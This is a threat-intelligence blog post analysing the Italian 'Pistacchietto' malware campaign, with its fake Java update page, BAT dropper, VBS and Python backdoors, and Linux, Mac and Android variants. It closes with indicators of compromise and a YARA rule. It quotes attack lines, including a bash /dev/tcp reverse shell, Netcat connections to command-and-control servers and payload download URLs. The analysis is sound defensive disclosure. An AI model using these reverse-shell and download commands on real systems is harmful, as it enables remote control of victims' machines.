3/7/2019Op. “Pistacchietto”: An Italian Job – Yoroi BlogOp. “Pistacchietto”: An Italian Job blog.yoroi.company/research/op-pistacchietto-an-italian-jobZLAB-YOROIMarch 6, 2019Introduction In the past weeks, a new strange campaign emerged in the Italian landscape. It has been baptized “Operation Pistacchietto” from a username extracted from a Github account used to serve some part of the malware. This campaign has been initially studied by C.R.A.M. researchers reporting the attacker seems to be Italian, as evidenced by some Italian words like “pistacchietto” or “boniﬁco” discovered into analyzed ﬁle names and scripts, and due to the location of most of the command and control servers.Figure 1. Servers’ location.After an initial recon, Cybaz-Yoroi ZLAB detected some peculiarities and interesting TTPs in place in this malicious operation, so we decided to dig further and analyze more samples related to this mysterious actor. The campaign is not very trivial and it is composed by several, speciﬁc, malwares, created to hit devices belonging to different platforms, both desktop and mobile. In the following sections, we analyze some of these malware, divided by targets’ architecture. MS Windows Samplesurl “Pistacchietto”: An Italian Job – Yoroi BlogThe story starts from a basic fake Java page, inviting the user to update his Java version clicking on the link.Figure 2. Fake Java update page.Despite the page reports the ﬁlename “window-update.hta”, clicking on “Update” a ﬁle .bat will be downloaded.Hash BAT downloader192:/eIsseWdvqEB45kY7EBk2k0EBxbkdEBBmk/kgkWOQmxl1LXqiV/uvN:/wyB4WYw‐ BkRNBeKBBBsDWwFwUploading this .bat ﬁle on VirusTotal emerges that it has a very low detection rate: only four anti-malwares were able to detect it.Figure 3. Detection rate of the initial BAT dropper.Inspecting the win.bat source code, at ﬁrst glance, it seems to be written by a script kiddie or to be a ﬁrst draft due the huge amount of comments. Moreover, the script is composed by two part: a ﬁrst one includes a trick to ask user administrative privileges, the second one aims to download other components and to set persistence using the Windows Task Scheduler (schtasks). As shown in ﬁgure, the ﬁrst part simply corresponds to a code snipped retrieved from Github public repositories.url “Pistacchietto”: An Italian Job – Yoroi BlogFigure 4. Comparison between the attacker’s code and the Github’s one. The second part, instead, checks the machine architecture and, depending on it, the malware downloads the right components, that are:A text ﬁle containing new actions to execute, from conﬁg01.homepc[.it/svc/wup.php? pc=pdf_%computername% The NETCAT utility for Windows, from conﬁg01.homepc[.it/win/nc64.exe and conﬁg01.homepc[.it/win/nc.exe The WGET utility for Windows, from conﬁg01.homepc[.it/win/wget.exe and conﬁg01.homepc[.it/win/wget32.exe Other malicious artifacts, from:conﬁg01.homepc[.it/win/get.vbs conﬁg01.homepc[.it/win/sys.xml conﬁg01.homepc[.it/win/syskill.xml conﬁg01.homepc[.it/win/ofﬁce_get.xml conﬁg01.homepc[.it/win/wofﬁce.exe conﬁg01.homepc[.it/win/init.vbs conﬁg01.homepc[.it/win/winsw.exeFigure 5. Part of BAT dropper’s code.From the snippet, a series of commented URL paths emerge, which is the proof that the malware is under maintenance yet. During the analysis days, indeed, the bat ﬁle and some other artifacts are constantly changed and updated, adding and removing code lines, changing variables names, but without changing the server URL or the general behavior. These modiﬁcations, even if related to attacker’s proofs or test cases, make the ﬁle constantly low-detectable by anti-malwares, because its signatures change each time.url “Pistacchietto”: An Italian Job – Yoroi BlogOther URLs embedded into the script, in commented way, are:hxxps://github[.com/pistacchietto/Win-Python-Backdoor/raw/master hxxp://veriﬁche.ddns[.net/{some_ﬁles}Inspecting the repository, we found some artifacts also hosted on the conﬁg01.homepc[.it/win/ location, so probably the attacker used that platform during the development phase and conﬁg01.homepc.it as real server containing “production” malware. The URL veriﬁche.ddns[.net seems to be down at time of writing, it could be a server used in an old version of this malicious project or in a future one.After downloading all the components, the batch script implants most of them into %windir% folder and one of them, the core of the malware, into C:\Program Files\Windows Defender. Then, the script registers some automatic tasks through schtasks in order to start periodically the malicious artifacts.Figure 6. Instructions to schedule the backdoor execution.The following section reports a brief analysis of these malicious ﬁles. Sample “ofﬁce_get.xml”Hash XML Task Scheduler Conﬁg48:yei1q9dBQSRiylw9c9V9LTra+iaiudupRCRvA9ufAuRa7T5XHPsV8icvOyp+++:tdBd‐ RiyuwdiaigVA9ll7dHFFvOC+It is a simple XML ﬁle in which is deﬁned the conﬁguration for a new scheduled task. In particular, the task created using this conﬁguration ﬁle has the only purpose of execute, in periodic way, a VisualBasic script located in C:\WINDOWS\get.vbs.Figure 7. Command embedded into XML ﬁle.Sample “get.vbs”url “Pistacchietto”: An Italian Job – Yoroi BlogHash VBS script48:eTGvmB9tJWBVn/Bn6+pmcN+yEa/5noEW/hRbr94fIn9+0RYcSniTGFurRwx:eT‐ GO1Yr/V6gmDyPJoE0hxGfIn9D1ITlxThe script downloads a shared ﬁle from Google Drive: url [.com/uc? export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF using a MSXML2.ServerXMLHTTP object. The ﬁle contains a list of servers URLs, as shown in ﬁgure:Figure 8. C2’s IP addresses.Two of them are IPv6 addresses: the usage of the new IP address standard is a rare feature in malware landscape. From the whois information related to these IPv6 addresses emerges that they are registered on the global ISP Hurricane Electric. This company also provides a free IPv6 Tunnel Broker service, able to act as a link between IPv4 and IPv6 protocols. There is no direct evidence of activity on that IPv6 addresses, however we think probably the attacker decided to masquerades its C2, which normally works over IPv4, behind the Hurricane’s IPv6 tunnel in order to make detection more difﬁcult. During the check-in, the malware proceed to extract some PC information, like computer name and MAC address, which will be sent to the server using a path composed by:http://" & serverURL & "/svc/wup.php?pc=" & strComputerName & "_" & mac The server responds with an encoded message indicating new actions the malware should perform. However, the VBS script seems to check only the “exec” ﬁeld, as shown in ﬁgure.Figure 9. Response from C2.If “exec” parameter is set to “1”, then the script extracts the value of “cmd” parameter, containing the new command to execute, and run it on Shell. All the other ﬁelds, at the moment, are not considered by the malware, indicating that it may be still under development.url “Pistacchietto”: An Italian Job – Yoroi BlogFigure 10. If EXEC parameter is set, execute the speciﬁed command.After executing the received commands, the script opens connection towards malicious server using the Netcat tool previously downloaded, providing to the attacker an access to the victim’s shell.Figure 11. Command to establish remote connection towards C2.Samples “wofﬁce.exe”, “wofﬁce2.exe” and “NisSrv.exe”Hash EXE from wofﬁce196608:eC0ma2TBEF4nfFzqgncRxhocAU/kfCf+51loM8XdFu/apXLl:eCI26dGnf‐ CW51ittnNLlThe “wofﬁce2.exe” and “NisSrv.exe” ﬁles are equal to “wofﬁce.exe”, which is simply the compiled version of “wofﬁce.py”, the Python source ﬁle hosted in the “Pistacchietto” repository. The Python code has the same behavior of the VBS bot previously analyzed, but it uses different C2 URLs, such as: Figure 12. Other C2’s IP embedded into “wofﬁce.py” ﬁle .So, the attacker created different copies of the same malicious backdoor, and set them to run at the same time, probably as resilience technique. Samples “sys.xml” and “syskill.xml”Hash XML Task Scheduler Conﬁg48:yei1q9dBQSJiydw9c9V9Lvara+iaiudupRCRvA9ufAuRa7T5XhPsV8iILG+++:tdBdJiy‐ Unknownurl “Pistacchietto”: An Italian Job – Yoroi BlogDescrip‐ tion ssdeepXML Task Scheduler Conﬁg48:yei1q9dtQSJiydw9c9V9Lvara+iaiudupRCRvA9ufAuRa7T5XhPsV8ioXy+++:tdtdJiyGi‐ GdiaigVA9ll7dhF0+These ﬁles are two XML task scheduler conﬁgurations, which embed the following commands:Figure 13. Commands embedded into XML ﬁle.So, the ﬁrst one starts a TCP connection every 1 minute using Netcat (“nc64.exe”), as previously shown, towards a new server “conﬁg02.addns[.org”. The second one, instead, kills all the active processes named “nc64.exe” every 5 minutes. Linux, OSX and Android Samples The attacker’s arsenal seems to be composed by weapons for different architectures: beyond Windows, there are some samples related to Linux, Mac and Android devices.In the Windows, Linux and Mac variant of the malware, the behavior is always the same: it implants the automatic execution of the Python backdoor previously shown.Hash Ofﬁce.py Linux backdoor96:Urlxr+CkrZcGbSRonYZm/ZCweAM2eiuVzZ9Q6CsW7XpyMZEg59y5E6AwKwA:U7+C krZcfnZgZEiuWEMZHs5E6+In the following ﬁgure is shown the initial bash ﬁle used to set the schedule of the “wofﬁce.py” backdoor, through the “crontab” and “systemctl” Linux commands.url “Pistacchietto”: An Italian Job – Yoroi BlogFigure 14. Linux initial BASH dropper.Obviously, all the Windows commands executed into the Win version of the backdoor must be replaced by the Unix one. So, the command “bash -i >& /dev/tcp/ip/port 0>&1” takes the place of the instruction used to establish the Netcat reverse shell in Windows.Figure 15. Linux commands used to establish a connection with C2.The Mac backdoor is very similar to Linux one, another time the “wofﬁce.py” is the core Ofﬁce.py OSX backdoor96:qTXEPcRrdj9iGxGy8g/VEhhBpypDR9jxmCY3leO2pDR9jx5jYO74MkWI7G9xcst:q9‐ due/cfypO2z4M2GlFigure 16. OSX backdoor’s setup ﬁle.Analyzing the repository emerges it is a copy of a OSX backdoor discussed in this blog post. Starting from this code, the attacker edited some modules to embed it in its own version of the backdoor.Moreover, the arsenal malicious arsenal counts also an Android RAT. It is a copy of the popular “AhMyth Android Rat”, edited by the attacker to include its command and control server’s IP addresses.url “Pistacchietto”: An Italian Job – Yoroi BlogFigure 17. Part of AhMyth RAT’s code modiﬁed by the attacker. Conclusions The “Pistacchietto” operation is more complex than we initially thought. Behind the lack of professional infrastructure, the “hiding in plain sight” strategy, the developer’s comments, the drafted malware code analyzed and the speculations about the possible amateur nature of this actor, we are in front of a long running espionage operation, active from years, and supporting at least four of the main computing platforms available nowadays, being able to infect Microsoft Windows hosts, Mac OSX systems, Linux servers and Android mobile devices. We are still not aware of the purposes of this campaign, which could be most likely personally motivated rather than ﬁnancially or state sponsored, but despite its limited numbers it represent an important warning security communities, individuals and companies should not ignore. Offensive capabilities to run criminal espionage operations are getting even more accessible to personally motivated cyber actors, conﬁrming the expansion of the cyber threat panorama both in terms of volume and variety observed by security ﬁrms, observatories and associations from a decade ago to nowadays.url “Pistacchietto”: An Italian Job – Yoroi BlogAs ﬁnal remark, we would like to recall Italy also is not new of this kind of “fai-da-te” (homemade) espionage operations: back in 2017 the initially homemade Occhionero’s espionage campaign (CERT-Yoroi Early Warning N010117) lapped Public Administrations, notorious entrepreneurs and also the Italian Ex Prime Minister. Indicators of compromise C2:hxxp://conﬁg01.homepc[.it hxxp://veriﬁche.ddns[.net hxxps://github[.com/pistacchietto/Win-Python-Backdoor/raw/master hxxp://paner.altervista[.org hxxp://conﬁg02.addns[.org certiﬁcates.ddns[.net 52.26.124[.145 visionstore[.info [2001:470: 25:686::2] (win.bat 20190225) (win.bat 20190226) (win.bat 20190227) condition:(1 of ($nc*)) and (1 of ($dns*)) or $id or $pathdescription = "Yara rule for Pistacchietto campaign" author = "Yoroi ZLab - Cybaze" last_updated = "2019-03-01" tlp = "white" category = "informational"rule pistacchietto_campaign_0219 { This blog post was authored by Antonio Farina and Luca Mella of Cybaze-Yoroi Z-LAB$nc = "nc.exe" wide ascii $nc64 = "nc64.exe" wide ascii $dns1 = "config02.addns.org" wide ascii $dns2 = "config01.homepc.it" wide ascii $dns3 = "verifiche.ddns.net" wide ascii $dns4 = "paner.altervista.org" wide ascii $dns5 = "certificates.ddns.net" wide ascii $id = "pistacchietto" wide ascii $path = "/svc/wup.php?pc=" wide asciiurl 